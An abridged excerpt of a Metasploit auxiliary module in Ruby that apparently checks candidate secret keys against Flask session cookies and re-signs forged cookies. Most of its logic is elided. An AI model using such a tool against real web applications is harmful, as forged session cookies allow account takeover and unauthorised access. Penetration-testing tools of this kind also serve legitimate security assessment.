...
class MetasploitModule < Msf::Auxiliary
  ...
  def action_find_secret
    print_status("Retrieving Cookie")
  ...
  def action_retrieve
    ...
    if Msf::Exploit::Remote::HTTP::FlaskUnsign::Session.valid?(cookie, secret, salt: salt)
      print_good("Secret key #{secret.inspect} is correct.")
    elsif datastore['SECRET'].present?
      print_warning("Secret key #{secret.inspect} is incorrect.")
    end
  end
  ...
  def run
    ...
    when 'Resign'
      ...
      print_good("New signed cookie: #{datastore['CookieName']}=#{encoded_cookie}")
    end
  end
